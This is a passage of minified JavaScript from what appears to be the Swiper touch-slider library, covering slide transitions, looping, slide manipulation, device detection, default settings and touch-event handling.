      0 === i ? n = r = !(s = 0) : (r = (s = (e - t.minTranslate()) / i) <= 0, n = 1 <= s), ee.extend(t, {
        progress: s,
        isBeginning: r,
        isEnd: n
      }), (a.watchSlidesProgress || a.watchSlidesVisibility) && t.updateSlidesProgress(e), r && !o && t.emit("reachBeginning toEdge"), n && !l && t.emit("reachEnd toEdge"), (o && !r || l && !n) && t.emit("fromEdge"), t.emit("progress", s);
    },
    updateSlidesClasses: function () {
      var e,
        t = this,
        a = t.slides,
        i = t.params,
        s = t.$wrapperEl,
        r = t.activeIndex,
        n = t.realIndex,
        o = t.virtual && i.virtual.enabled;
      a.removeClass(i.slideActiveClass + " " + i.slideNextClass + " " + i.slidePrevClass + " " + i.slideDuplicateActiveClass + " " + i.slideDuplicateNextClass + " " + i.slideDuplicatePrevClass), (e = o ? t.$wrapperEl.find("." + i.slideClass + '[data-swiper-slide-index="' + r + '"]') : a.eq(r)).addClass(i.slideActiveClass), i.loop && (e.hasClass(i.slideDuplicateClass) ? s.children("." + i.slideClass + ":not(." + i.slideDuplicateClass + ')[data-swiper-slide-index="' + n + '"]').addClass(i.slideDuplicateActiveClass) : s.children("." + i.slideClass + "." + i.slideDuplicateClass + '[data-swiper-slide-index="' + n + '"]').addClass(i.slideDuplicateActiveClass));
      var l = e.nextAll("." + i.slideClass).eq(0).addClass(i.slideNextClass);
      i.loop && 0 === l.length && (l = a.eq(0)).addClass(i.slideNextClass);
      var d = e.prevAll("." + i.slideClass).eq(0).addClass(i.slidePrevClass);
      i.loop && 0 === d.length && (d = a.eq(-1)).addClass(i.slidePrevClass), i.loop && (l.hasClass(i.slideDuplicateClass) ? s.children("." + i.slideClass + ":not(." + i.slideDuplicateClass + ')[data-swiper-slide-index="' + l.attr("data-swiper-slide-index") + '"]').addClass(i.slideDuplicateNextClass) : s.children("." + i.slideClass + "." + i.slideDuplicateClass + '[data-swiper-slide-index="' + l.attr("data-swiper-slide-index") + '"]').addClass(i.slideDuplicateNextClass), d.hasClass(i.slideDuplicateClass) ? s.children("." + i.slideClass + ":not(." + i.slideDuplicateClass + ')[data-swiper-slide-index="' + d.attr("data-swiper-slide-index") + '"]').addClass(i.slideDuplicatePrevClass) : s.children("." + i.slideClass + "." + i.slideDuplicateClass + '[data-swiper-slide-index="' + d.attr("data-swiper-slide-index") + '"]').addClass(i.slideDuplicatePrevClass));
    },
    updateActiveIndex: function (e) {
      var t,
        a = this,
        i = a.rtlTranslate ? a.translate : -a.translate,
        s = a.slidesGrid,
        r = a.snapGrid,
        n = a.params,
        o = a.activeIndex,
        l = a.realIndex,
        d = a.snapIndex,
        p = e;
      if (void 0 === p) {
        for (var c = 0; c < s.length; c += 1) void 0 !== s[c + 1] ? i >= s[c] && i < s[c + 1] - (s[c + 1] - s[c]) / 2 ? p = c : i >= s[c] && i < s[c + 1] && (p = c + 1) : i >= s[c] && (p = c);
        n.normalizeSlideIndex && (p < 0 || void 0 === p) && (p = 0);
      }
      if ((t = 0 <= r.indexOf(i) ? r.indexOf(i) : Math.floor(p / n.slidesPerGroup)) >= r.length && (t = r.length - 1), p !== o) {
        var u = parseInt(a.slides.eq(p).attr("data-swiper-slide-index") || p, 10);
        ee.extend(a, {
          snapIndex: t,
          realIndex: u,
          previousIndex: o,
          activeIndex: p
        }), a.emit("activeIndexChange"), a.emit("snapIndexChange"), l !== u && a.emit("realIndexChange"), a.emit("slideChange");
      } else t !== d && (a.snapIndex = t, a.emit("snapIndexChange"));
    },
    updateClickedSlide: function (e) {
      var t = this,
        a = t.params,
        i = L(e.target).closest("." + a.slideClass)[0],
        s = !1;
      if (i) for (var r = 0; r < t.slides.length; r += 1) t.slides[r] === i && (s = !0);
      if (!i || !s) return t.clickedSlide = void 0, void (t.clickedIndex = void 0);
      t.clickedSlide = i, t.virtual && t.params.virtual.enabled ? t.clickedIndex = parseInt(L(i).attr("data-swiper-slide-index"), 10) : t.clickedIndex = L(i).index(), a.slideToClickedSlide && void 0 !== t.clickedIndex && t.clickedIndex !== t.activeIndex && t.slideToClickedSlide();
    }
  };
  var p = {
    getTranslate: function (e) {
      void 0 === e && (e = this.isHorizontal() ? "x" : "y");
      var t = this.params,
        a = this.rtlTranslate,
        i = this.translate,
        s = this.$wrapperEl;
      if (t.virtualTranslate) return a ? -i : i;
      var r = ee.getTranslate(s[0], e);
      return a && (r = -r), r || 0;
    },
    setTranslate: function (e, t) {
      var a = this,
        i = a.rtlTranslate,
        s = a.params,
        r = a.$wrapperEl,
        n = a.progress,
        o = 0,
        l = 0;
      a.isHorizontal() ? o = i ? -e : e : l = e, s.roundLengths && (o = Math.floor(o), l = Math.floor(l)), s.virtualTranslate || (te.transforms3d ? r.transform("translate3d(" + o + "px, " + l + "px, 0px)") : r.transform("translate(" + o + "px, " + l + "px)")), a.previousTranslate = a.translate, a.translate = a.isHorizontal() ? o : l;
      var d = a.maxTranslate() - a.minTranslate();
      (0 === d ? 0 : (e - a.minTranslate()) / d) !== n && a.updateProgress(e), a.emit("setTranslate", a.translate, t);
    },
    minTranslate: function () {
      return -this.snapGrid[0];
    },
    maxTranslate: function () {
      return -this.snapGrid[this.snapGrid.length - 1];
    }
  };
  var c = {
    setTransition: function (e, t) {
      this.$wrapperEl.transition(e), this.emit("setTransition", e, t);
    },
    transitionStart: function (e, t) {
      void 0 === e && (e = !0);
      var a = this,
        i = a.activeIndex,
        s = a.params,
        r = a.previousIndex;
      s.autoHeight && a.updateAutoHeight();
      var n = t;
      if (n || (n = r < i ? "next" : i < r ? "prev" : "reset"), a.emit("transitionStart"), e && i !== r) {
        if ("reset" === n) return void a.emit("slideResetTransitionStart");
        a.emit("slideChangeTransitionStart"), "next" === n ? a.emit("slideNextTransitionStart") : a.emit("slidePrevTransitionStart");
      }
    },
    transitionEnd: function (e, t) {
      void 0 === e && (e = !0);
      var a = this,
        i = a.activeIndex,
        s = a.previousIndex;
      a.animating = !1, a.setTransition(0);
      var r = t;
      if (r || (r = s < i ? "next" : i < s ? "prev" : "reset"), a.emit("transitionEnd"), e && i !== s) {
        if ("reset" === r) return void a.emit("slideResetTransitionEnd");
        a.emit("slideChangeTransitionEnd"), "next" === r ? a.emit("slideNextTransitionEnd") : a.emit("slidePrevTransitionEnd");
      }
    }
  };
  var u = {
    slideTo: function (e, t, a, i) {
      void 0 === e && (e = 0), void 0 === t && (t = this.params.speed), void 0 === a && (a = !0);
      var s = this,
        r = e;
      r < 0 && (r = 0);
      var n = s.params,
        o = s.snapGrid,
        l = s.slidesGrid,
        d = s.previousIndex,
        p = s.activeIndex,
        c = s.rtlTranslate;
      if (s.animating && n.preventInteractionOnTransition) return !1;
      var u = Math.floor(r / n.slidesPerGroup);
      u >= o.length && (u = o.length - 1), (p || n.initialSlide || 0) === (d || 0) && a && s.emit("beforeSlideChangeStart");
      var h,
        v = -o[u];
      if (s.updateProgress(v), n.normalizeSlideIndex) for (var f = 0; f < l.length; f += 1) -Math.floor(100 * v) >= Math.floor(100 * l[f]) && (r = f);
      if (s.initialized && r !== p) {
        if (!s.allowSlideNext && v < s.translate && v < s.minTranslate()) return !1;
        if (!s.allowSlidePrev && v > s.translate && v > s.maxTranslate() && (p || 0) !== r) return !1;
      }
      return h = p < r ? "next" : r < p ? "prev" : "reset", c && -v === s.translate || !c && v === s.translate ? (s.updateActiveIndex(r), n.autoHeight && s.updateAutoHeight(), s.updateSlidesClasses(), "slide" !== n.effect && s.setTranslate(v), "reset" !== h && (s.transitionStart(a, h), s.transitionEnd(a, h)), !1) : (0 !== t && te.transition ? (s.setTransition(t), s.setTranslate(v), s.updateActiveIndex(r), s.updateSlidesClasses(), s.emit("beforeTransitionStart", t, i), s.transitionStart(a, h), s.animating || (s.animating = !0, s.onSlideToWrapperTransitionEnd || (s.onSlideToWrapperTransitionEnd = function (e) {
        s && !s.destroyed && e.target === this && (s.$wrapperEl[0].removeEventListener("transitionend", s.onSlideToWrapperTransitionEnd), s.$wrapperEl[0].removeEventListener("webkitTransitionEnd", s.onSlideToWrapperTransitionEnd), s.onSlideToWrapperTransitionEnd = null, delete s.onSlideToWrapperTransitionEnd, s.transitionEnd(a, h));
      }), s.$wrapperEl[0].addEventListener("transitionend", s.onSlideToWrapperTransitionEnd), s.$wrapperEl[0].addEventListener("webkitTransitionEnd", s.onSlideToWrapperTransitionEnd))) : (s.setTransition(0), s.setTranslate(v), s.updateActiveIndex(r), s.updateSlidesClasses(), s.emit("beforeTransitionStart", t, i), s.transitionStart(a, h), s.transitionEnd(a, h)), !0);
    },
    slideToLoop: function (e, t, a, i) {
      void 0 === e && (e = 0), void 0 === t && (t = this.params.speed), void 0 === a && (a = !0);
      var s = e;
      return this.params.loop && (s += this.loopedSlides), this.slideTo(s, t, a, i);
    },
    slideNext: function (e, t, a) {
      void 0 === e && (e = this.params.speed), void 0 === t && (t = !0);
      var i = this,
        s = i.params,
        r = i.animating;
      return s.loop ? !r && (i.loopFix(), i._clientLeft = i.$wrapperEl[0].clientLeft, i.slideTo(i.activeIndex + s.slidesPerGroup, e, t, a)) : i.slideTo(i.activeIndex + s.slidesPerGroup, e, t, a);
    },
    slidePrev: function (e, t, a) {
      void 0 === e && (e = this.params.speed), void 0 === t && (t = !0);
      var i = this,
        s = i.params,
        r = i.animating,
        n = i.snapGrid,
        o = i.slidesGrid,
        l = i.rtlTranslate;
      if (s.loop) {
        if (r) return !1;
        i.loopFix(), i._clientLeft = i.$wrapperEl[0].clientLeft;
      }
      function d(e) {
        return e < 0 ? -Math.floor(Math.abs(e)) : Math.floor(e);
      }
      var p,
        c = d(l ? i.translate : -i.translate),
        u = n.map(function (e) {
          return d(e);
        }),
        h = (o.map(function (e) {
          return d(e);
        }), n[u.indexOf(c)], n[u.indexOf(c) - 1]);
      return void 0 !== h && (p = o.indexOf(h)) < 0 && (p = i.activeIndex - 1), i.slideTo(p, e, t, a);
    },
    slideReset: function (e, t, a) {
      return void 0 === e && (e = this.params.speed), void 0 === t && (t = !0), this.slideTo(this.activeIndex, e, t, a);
    },
    slideToClosest: function (e, t, a) {
      void 0 === e && (e = this.params.speed), void 0 === t && (t = !0);
      var i = this,
        s = i.activeIndex,
        r = Math.floor(s / i.params.slidesPerGroup);
      if (r < i.snapGrid.length - 1) {
        var n = i.rtlTranslate ? i.translate : -i.translate,
          o = i.snapGrid[r];
        (i.snapGrid[r + 1] - o) / 2 < n - o && (s = i.params.slidesPerGroup);
      }
      return i.slideTo(s, e, t, a);
    },
    slideToClickedSlide: function () {
      var e,
        t = this,
        a = t.params,
        i = t.$wrapperEl,
        s = "auto" === a.slidesPerView ? t.slidesPerViewDynamic() : a.slidesPerView,
        r = t.clickedIndex;
      if (a.loop) {
        if (t.animating) return;
        e = parseInt(L(t.clickedSlide).attr("data-swiper-slide-index"), 10), a.centeredSlides ? r < t.loopedSlides - s / 2 || r > t.slides.length - t.loopedSlides + s / 2 ? (t.loopFix(), r = i.children("." + a.slideClass + '[data-swiper-slide-index="' + e + '"]:not(.' + a.slideDuplicateClass + ")").eq(0).index(), ee.nextTick(function () {
          t.slideTo(r);
        })) : t.slideTo(r) : r > t.slides.length - s ? (t.loopFix(), r = i.children("." + a.slideClass + '[data-swiper-slide-index="' + e + '"]:not(.' + a.slideDuplicateClass + ")").eq(0).index(), ee.nextTick(function () {
          t.slideTo(r);
        })) : t.slideTo(r);
      } else t.slideTo(r);
    }
  };
  var h = {
    loopCreate: function () {
      var i = this,
        e = i.params,
        t = i.$wrapperEl;
      t.children("." + e.slideClass + "." + e.slideDuplicateClass).remove();
      var s = t.children("." + e.slideClass);
      if (e.loopFillGroupWithBlank) {
        var a = e.slidesPerGroup - s.length % e.slidesPerGroup;
        if (a !== e.slidesPerGroup) {
          for (var r = 0; r < a; r += 1) {
            var n = L(f.createElement("div")).addClass(e.slideClass + " " + e.slideBlankClass);
            t.append(n);
          }
          s = t.children("." + e.slideClass);
        }
      }
      "auto" !== e.slidesPerView || e.loopedSlides || (e.loopedSlides = s.length), i.loopedSlides = parseInt(e.loopedSlides || e.slidesPerView, 10), i.loopedSlides += e.loopAdditionalSlides, i.loopedSlides > s.length && (i.loopedSlides = s.length);
      var o = [],
        l = [];
      s.each(function (e, t) {
        var a = L(t);
        e < i.loopedSlides && l.push(t), e < s.length && e >= s.length - i.loopedSlides && o.push(t), a.attr("data-swiper-slide-index", e);
      });
      for (var d = 0; d < l.length; d += 1) t.append(L(l[d].cloneNode(!0)).addClass(e.slideDuplicateClass));
      for (var p = o.length - 1; 0 <= p; p -= 1) t.prepend(L(o[p].cloneNode(!0)).addClass(e.slideDuplicateClass));
    },
    loopFix: function () {
      var e,
        t = this,
        a = t.params,
        i = t.activeIndex,
        s = t.slides,
        r = t.loopedSlides,
        n = t.allowSlidePrev,
        o = t.allowSlideNext,
        l = t.snapGrid,
        d = t.rtlTranslate;
      t.allowSlidePrev = !0, t.allowSlideNext = !0;
      var p = -l[i] - t.getTranslate();
      i < r ? (e = s.length - 3 * r + i, e += r, t.slideTo(e, 0, !1, !0) && 0 !== p && t.setTranslate((d ? -t.translate : t.translate) - p)) : ("auto" === a.slidesPerView && 2 * r <= i || i >= s.length - r) && (e = -s.length + i + r, e += r, t.slideTo(e, 0, !1, !0) && 0 !== p && t.setTranslate((d ? -t.translate : t.translate) - p));
      t.allowSlidePrev = n, t.allowSlideNext = o;
    },
    loopDestroy: function () {
      var e = this.$wrapperEl,
        t = this.params,
        a = this.slides;
      e.children("." + t.slideClass + "." + t.slideDuplicateClass + ",." + t.slideClass + "." + t.slideBlankClass).remove(), a.removeAttr("data-swiper-slide-index");
    }
  };
  var v = {
    setGrabCursor: function (e) {
      if (!(te.touch || !this.params.simulateTouch || this.params.watchOverflow && this.isLocked)) {
        var t = this.el;
        t.style.cursor = "move", t.style.cursor = e ? "-webkit-grabbing" : "-webkit-grab", t.style.cursor = e ? "-moz-grabbin" : "-moz-grab", t.style.cursor = e ? "grabbing" : "grab";
      }
    },
    unsetGrabCursor: function () {
      te.touch || this.params.watchOverflow && this.isLocked || (this.el.style.cursor = "");
    }
  };
  var m = {
      appendSlide: function (e) {
        var t = this,
          a = t.$wrapperEl,
          i = t.params;
        if (i.loop && t.loopDestroy(), "object" == typeof e && "length" in e) for (var s = 0; s < e.length; s += 1) e[s] && a.append(e[s]);else a.append(e);
        i.loop && t.loopCreate(), i.observer && te.observer || t.update();
      },
      prependSlide: function (e) {
        var t = this,
          a = t.params,
          i = t.$wrapperEl,
          s = t.activeIndex;
        a.loop && t.loopDestroy();
        var r = s + 1;
        if ("object" == typeof e && "length" in e) {
          for (var n = 0; n < e.length; n += 1) e[n] && i.prepend(e[n]);
          r = s + e.length;
        } else i.prepend(e);
        a.loop && t.loopCreate(), a.observer && te.observer || t.update(), t.slideTo(r, 0, !1);
      },
      addSlide: function (e, t) {
        var a = this,
          i = a.$wrapperEl,
          s = a.params,
          r = a.activeIndex;
        s.loop && (r -= a.loopedSlides, a.loopDestroy(), a.slides = i.children("." + s.slideClass));
        var n = a.slides.length;
        if (e <= 0) a.prependSlide(t);else if (n <= e) a.appendSlide(t);else {
          for (var o = e < r ? r + 1 : r, l = [], d = n - 1; e <= d; d -= 1) {
            var p = a.slides.eq(d);
            p.remove(), l.unshift(p);
          }
          if ("object" == typeof t && "length" in t) {
            for (var c = 0; c < t.length; c += 1) t[c] && i.append(t[c]);
            o = e < r ? r + t.length : r;
          } else i.append(t);
          for (var u = 0; u < l.length; u += 1) i.append(l[u]);
          s.loop && a.loopCreate(), s.observer && te.observer || a.update(), s.loop ? a.slideTo(o + a.loopedSlides, 0, !1) : a.slideTo(o, 0, !1);
        }
      },
      removeSlide: function (e) {
        var t = this,
          a = t.params,
          i = t.$wrapperEl,
          s = t.activeIndex;
        a.loop && (s -= t.loopedSlides, t.loopDestroy(), t.slides = i.children("." + a.slideClass));
        var r,
          n = s;
        if ("object" == typeof e && "length" in e) {
          for (var o = 0; o < e.length; o += 1) r = e[o], t.slides[r] && t.slides.eq(r).remove(), r < n && (n -= 1);
          n = Math.max(n, 0);
        } else r = e, t.slides[r] && t.slides.eq(r).remove(), r < n && (n -= 1), n = Math.max(n, 0);
        a.loop && t.loopCreate(), a.observer && te.observer || t.update(), a.loop ? t.slideTo(n + t.loopedSlides, 0, !1) : t.slideTo(n, 0, !1);
      },
      removeAllSlides: function () {
        for (var e = [], t = 0; t < this.slides.length; t += 1) e.push(t);
        this.removeSlide(e);
      }
    },
    g = function () {
      var e = J.navigator.userAgent,
        t = {
          ios: !1,
          android: !1,
          androidChrome: !1,
          desktop: !1,
          windows: !1,
          iphone: !1,
          ipod: !1,
          ipad: !1,
          cordova: J.cordova || J.phonegap,
          phonegap: J.cordova || J.phonegap
        },
        a = e.match(/(Windows Phone);?[\s\/]+([\d.]+)?/),
        i = e.match(/(Android);?[\s\/]+([\d.]+)?/),
        s = e.match(/(iPad).*OS\s([\d_]+)/),
        r = e.match(/(iPod)(.*OS\s([\d_]+))?/),
        n = !s && e.match(/(iPhone\sOS|iOS)\s([\d_]+)/);
      if (a && (t.os = "windows", t.osVersion = a[2], t.windows = !0), i && !a && (t.os = "android", t.osVersion = i[2], t.android = !0, t.androidChrome = 0 <= e.toLowerCase().indexOf("chrome")), (s || n || r) && (t.os = "ios", t.ios = !0), n && !r && (t.osVersion = n[2].replace(/_/g, "."), t.iphone = !0), s && (t.osVersion = s[2].replace(/_/g, "."), t.ipad = !0), r && (t.osVersion = r[3] ? r[3].replace(/_/g, ".") : null, t.iphone = !0), t.ios && t.osVersion && 0 <= e.indexOf("Version/") && "10" === t.osVersion.split(".")[0] && (t.osVersion = e.toLowerCase().split("version/")[1].split(" ")[0]), t.desktop = !(t.os || t.android || t.webView), t.webView = (n || s || r) && e.match(/.*AppleWebKit(?!.*Safari)/i), t.os && "ios" === t.os) {
        var o = t.osVersion.split("."),
          l = f.querySelector('meta[name="viewport"]');
        t.minimalUi = !t.webView && (r || n) && (1 * o[0] == 7 ? 1 <= 1 * o[1] : 7 < 1 * o[0]) && l && 0 <= l.getAttribute("content").indexOf("minimal-ui");
      }
      return t.pixelRatio = J.devicePixelRatio || 1, t;
    }();
  function b() {
    var e = this,
      t = e.params,
      a = e.el;
    if (!a || 0 !== a.offsetWidth) {
      t.breakpoints && e.setBreakpoint();
      var i = e.allowSlideNext,
        s = e.allowSlidePrev,
        r = e.snapGrid;
      if (e.allowSlideNext = !0, e.allowSlidePrev = !0, e.updateSize(), e.updateSlides(), t.freeMode) {
        var n = Math.min(Math.max(e.translate, e.maxTranslate()), e.minTranslate());
        e.setTranslate(n), e.updateActiveIndex(), e.updateSlidesClasses(), t.autoHeight && e.updateAutoHeight();
      } else e.updateSlidesClasses(), ("auto" === t.slidesPerView || 1 < t.slidesPerView) && e.isEnd && !e.params.centeredSlides ? e.slideTo(e.slides.length - 1, 0, !1, !0) : e.slideTo(e.activeIndex, 0, !1, !0);
      e.allowSlidePrev = s, e.allowSlideNext = i, e.params.watchOverflow && r !== e.snapGrid && e.checkOverflow();
    }
  }
  var w = {
      init: !0,
      direction: "horizontal",
      touchEventsTarget: "container",
      initialSlide: 0,
      speed: 300,
      preventInteractionOnTransition: !1,
      edgeSwipeDetection: !1,
      edgeSwipeThreshold: 20,
      freeMode: !1,
      freeModeMomentum: !0,
      freeModeMomentumRatio: 1,
      freeModeMomentumBounce: !0,
      freeModeMomentumBounceRatio: 1,
      freeModeMomentumVelocityRatio: 1,
      freeModeSticky: !1,
      freeModeMinimumVelocity: .02,
      autoHeight: !1,
      setWrapperSize: !1,
      virtualTranslate: !1,
      effect: "slide",
      breakpoints: void 0,
      breakpointsInverse: !1,
      spaceBetween: 0,
      slidesPerView: 1,
      slidesPerColumn: 1,
      slidesPerColumnFill: "column",
      slidesPerGroup: 1,
      centeredSlides: !1,
      slidesOffsetBefore: 0,
      slidesOffsetAfter: 0,
      normalizeSlideIndex: !0,
      centerInsufficientSlides: !1,
      watchOverflow: !1,
      roundLengths: !1,
      touchRatio: 1,
      touchAngle: 45,
      simulateTouch: !0,
      shortSwipes: !0,
      longSwipes: !0,
      longSwipesRatio: .5,
      longSwipesMs: 300,
      followFinger: !0,
      allowTouchMove: !0,
      threshold: 0,
      touchMoveStopPropagation: !0,
      touchStartPreventDefault: !0,
      touchStartForcePreventDefault: !1,
      touchReleaseOnEdges: !1,
      uniqueNavElements: !0,
      resistance: !0,
      resistanceRatio: .85,
      watchSlidesProgress: !1,
      watchSlidesVisibility: !1,
      grabCursor: !1,
      preventClicks: !0,
      preventClicksPropagation: !0,
      slideToClickedSlide: !1,
      preloadImages: !0,
      updateOnImagesReady: !0,
      loop: !1,
      loopAdditionalSlides: 0,
      loopedSlides: null,
      loopFillGroupWithBlank: !1,
      allowSlidePrev: !0,
      allowSlideNext: !0,
      swipeHandler: null,
      noSwiping: !0,
      noSwipingClass: "swiper-no-swiping",
      noSwipingSelector: null,
      passiveListeners: !0,
      containerModifierClass: "swiper-container-",
      slideClass: "swiper-slide",
      slideBlankClass: "swiper-slide-invisible-blank",
      slideActiveClass: "swiper-slide-active",
      slideDuplicateActiveClass: "swiper-slide-duplicate-active",
      slideVisibleClass: "swiper-slide-visible",
      slideDuplicateClass: "swiper-slide-duplicate",
      slideNextClass: "swiper-slide-next",
      slideDuplicateNextClass: "swiper-slide-duplicate-next",
      slidePrevClass: "swiper-slide-prev",
      slideDuplicatePrevClass: "swiper-slide-duplicate-prev",
      wrapperClass: "swiper-wrapper",
      runCallbacksOnInit: !0
    },
    y = {
      update: d,
      translate: p,
      transition: c,
      slide: u,
      loop: h,
      grabCursor: v,
      manipulation: m,
      events: {
        attachEvents: function () {
          var e = this,
            t = e.params,
            a = e.touchEvents,
            i = e.el,
            s = e.wrapperEl;
          e.onTouchStart = function (e) {
            var t = this,
              a = t.touchEventsData,
              i = t.params,
              s = t.touches;
            if (!t.animating || !i.preventInteractionOnTransition) {
              var r = e;
              if (r.originalEvent && (r = r.originalEvent), a.isTouchEvent = "touchstart" === r.type, (a.isTouchEvent || !("which" in r) || 3 !== r.which) && !(!a.isTouchEvent && "button" in r && 0 < r.button || a.isTouched && a.isMoved)) if (i.noSwiping && L(r.target).closest(i.noSwipingSelector ? i.noSwipingSelector : "." + i.noSwipingClass)[0]) t.allowClick = !0;else if (!i.swipeHandler || L(r).closest(i.swipeHandler)[0]) {
                s.currentX = "touchstart" === r.type ? r.targetTouches[0].pageX : r.pageX, s.currentY = "touchstart" === r.type ? r.targetTouches[0].pageY : r.pageY;
                var n = s.currentX,
                  o = s.currentY,
                  l = i.edgeSwipeDetection || i.iOSEdgeSwipeDetection,
                  d = i.edgeSwipeThreshold || i.iOSEdgeSwipeThreshold;
                if (!l || !(n <= d || n >= J.screen.width - d)) {
                  if (ee.extend(a, {
                    isTouched: !0,
                    isMoved: !1,
                    allowTouchCallbacks: !0,
                    isScrolling: void 0,
                    startMoving: void 0
                  }), s.startX = n, s.startY = o, a.touchStartTime = ee.now(), t.allowClick = !0, t.updateSize(), t.swipeDirection = void 0, 0 < i.threshold && (a.allowThresholdMove = !1), "touchstart" !== r.type) {
                    var p = !0;
                    L(r.target).is(a.formElements) && (p = !1), f.activeElement && L(f.activeElement).is(a.formElements) && f.activeElement !== r.target && f.activeElement.blur();
                    var c = p && t.allowTouchMove && i.touchStartPreventDefault;
                    (i.touchStartForcePreventDefault || c) && r.preventDefault();
                  }
                  t.emit("touchStart", r);
                }
              }
            }
          }.bind(e), e.onTouchMove = function (e) {
            var t = this,
              a = t.touchEventsData,
              i = t.params,
              s = t.touches,
              r = t.rtlTranslate,
              n = e;
            if (n.originalEvent && (n = n.originalEvent), a.isTouched) {
              if (!a.isTouchEvent || "mousemove" !== n.type) {
                var o = "touchmove" === n.type ? n.targetTouches[0].pageX : n.pageX,
                  l = "touchmove" === n.type ? n.targetTouches[0].pageY : n.pageY;
                if (n.preventedByNestedSwiper) return s.startX = o, void (s.startY = l);
                if (!t.allowTouchMove) return t.allowClick = !1, void (a.isTouched && (ee.extend(s, {
                  startX: o,
                  startY: l,
                  currentX: o,
                  currentY: l
                }), a.touchStartTime = ee.now()));
                if (a.isTouchEvent && i.touchReleaseOnEdges && !i.loop) if (t.isVertical()) {
                  if (l < s.startY && t.translate <= t.maxTranslate() || l > s.startY && t.translate >= t.minTranslate()) return a.isTouched = !1, void (a.isMoved = !1);
                } else if (o < s.startX && t.translate <= t.maxTranslate() || o > s.startX && t.translate >= t.minTranslate()) return;
                if (a.isTouchEvent && f.activeElement && n.target === f.activeElement && L(n.target).is(a.formElements)) return a.isMoved = !0, void (t.allowClick = !1);
                if (a.allowTouchCallbacks && t.emit("touchMove", n), !(n.targetTouches && 1 < n.targetTouches.length)) {
                  s.currentX = o, s.currentY = l;
                  var d,
                    p = s.currentX - s.startX,
                    c = s.currentY - s.startY;
                  if (!(t.params.threshold && Math.sqrt(Math.pow(p, 2) + Math.pow(c, 2)) < t.params.threshold)) if (void 0 === a.isScrolling && (t.isHorizontal() && s.currentY === s.startY || t.isVertical() && s.currentX === s.startX ? a.isScrolling = !1 : 25 <= p * p + c * c && (d = 180 * Math.atan2(Math.abs(c), Math.abs(p)) / Math.PI, a.isScrolling = t.isHorizontal() ? d > i.touchAngle : 90 - d > i.touchAngle)), a.isScrolling && t.emit("touchMoveOpposite", n), void 0 === a.startMoving && (s.currentX === s.startX && s.currentY === s.startY || (a.startMoving = !0)), a.isScrolling) a.isTouched = !1;else if (a.startMoving) {
                    t.allowClick = !1, n.preventDefault(), i.touchMoveStopPropagation && !i.nested && n.stopPropagation(), a.isMoved || (i.loop && t.loopFix(), a.startTranslate = t.getTranslate(), t.setTransition(0), t.animating && t.$wrapperEl.trigger("webkitTransitionEnd transitionend"), a.allowMomentumBounce = !1, !i.grabCursor || !0 !== t.allowSlideNext && !0 !== t.allowSlidePrev || t.setGrabCursor(!0), t.emit("sliderFirstMove", n)), t.emit("sliderMove", n), a.isMoved = !0;
                    var u = t.isHorizontal() ? p : c;
                    s.diff = u, u *= i.touchRatio, r && (u = -u), t.swipeDirection = 0 < u ? "prev" : "next", a.currentTranslate = u + a.startTranslate;
                    var h = !0,
                      v = i.resistanceRatio;
                    if (i.touchReleaseOnEdges && (v = 0), 0 < u && a.currentTranslate > t.minTranslate() ? (h = !1, i.resistance && (a.currentTranslate = t.minTranslate() - 1 + Math.pow(-t.minTranslate() + a.startTranslate + u, v))) : u < 0 && a.currentTranslate < t.maxTranslate() && (h = !1, i.resistance && (a.currentTranslate = t.maxTranslate() + 1 - Math.pow(t.maxTranslate() - a.startTranslate - u, v))), h && (n.preventedByNestedSwiper = !0), !t.allowSlideNext && "next" === t.swipeDirection && a.currentTranslate < a.startTranslate && (a.currentTranslate = a.startTranslate), !t.allowSlidePrev && "prev" === t.swipeDirection && a.currentTranslate > a.startTranslate && (a.currentTranslate = a.startTranslate), 0 < i.threshold) {
                      if (!(Math.abs(u) > i.threshold || a.allowThresholdMove)) return void (a.currentTranslate = a.startTranslate);
                      if (!a.allowThresholdMove) return a.allowThresholdMove = !0, s.startX = s.currentX, s.startY = s.currentY, a.currentTranslate = a.startTranslate, void (s.diff = t.isHorizontal() ? s.currentX - s.startX : s.currentY - s.startY);
                    }
                    i.followFinger && ((i.freeMode || i.watchSlidesProgress || i.watchSlidesVisibility) && (t.updateActiveIndex(), t.updateSlidesClasses()), i.freeMode && (0 === a.velocities.length && a.velocities.push({
                      position: s[t.isHorizontal() ? "startX" : "startY"],
                      time: a.touchStartTime
                    }), a.velocities.push({
                      position: s[t.isHorizontal() ? "currentX" : "currentY"],
                      time: ee.now()
                    })), t.updateProgress(a.currentTranslate), t.setTranslate(a.currentTranslate));
                  }
                }
              }
            } else a.startMoving && a.isScrolling && t.emit("touchMoveOpposite", n);
          }.bind(e), e.onTouchEnd = function (e) {
            var t = this,
              a = t.touchEventsData,
              i = t.params,
              s = t.touches,
              r = t.rtlTranslate,
              n = t.$wrapperEl,
              o = t.slidesGrid,
              l = t.snapGrid,
              d = e;
            if (d.originalEvent && (d = d.originalEvent), a.allowTouchCallbacks && t.emit("touchEnd", d), a.allowTouchCallbacks = !1, !a.isTouched) return a.isMoved && i.grabCursor && t.setGrabCursor(!1), a.isMoved = !1, void (a.startMoving = !1);
            i.grabCursor && a.isMoved && a.isTouched && (!0 === t.allowSlideNext || !0 === t.allowSlidePrev) && t.setGrabCursor(!1);
            var p,
              c = ee.now(),
              u = c - a.touchStartTime;
            if (t.allowClick && (t.updateClickedSlide(d), t.emit("tap", d), u < 300 && 300 < c - a.lastClickTime && (a.clickTimeout && clearTimeout(a.clickTimeout), a.clickTimeout = ee.nextTick(function () {
              t && !t.destroyed && t.emit("click", d);
            }, 300)), u < 300 && c - a.lastClickTime < 300 && (a.clickTimeout && clearTimeout(a.clickTimeout), t.emit("doubleTap", d))), a.lastClickTime = ee.now(), ee.nextTick(function () {
              t.destroyed || (t.allowClick = !0);
            }), !a.isTouched || !a.isMoved || !t.swipeDirection || 0 === s.diff || a.currentTranslate === a.startTranslate) return a.isTouched = !1, a.isMoved = !1, void (a.startMoving = !1);
            if (a.isTouched = !1, a.isMoved = !1, a.startMoving = !1, p = i.followFinger ? r ? t.translate : -t.translate : -a.currentTranslate, i.freeMode) {
              if (p < -t.minTranslate()) return void t.slideTo(t.activeIndex);
              if (p > -t.maxTranslate()) return void (t.slides.length < l.length ? t.slideTo(l.length - 1) : t.slideTo(t.slides.length - 1));
              if (i.freeModeMomentum) {
                if (1 < a.velocities.length) {
                  var h = a.velocities.pop(),
                    v = a.velocities.pop(),
                    f = h.position - v.position,
                    m = h.time - v.time;
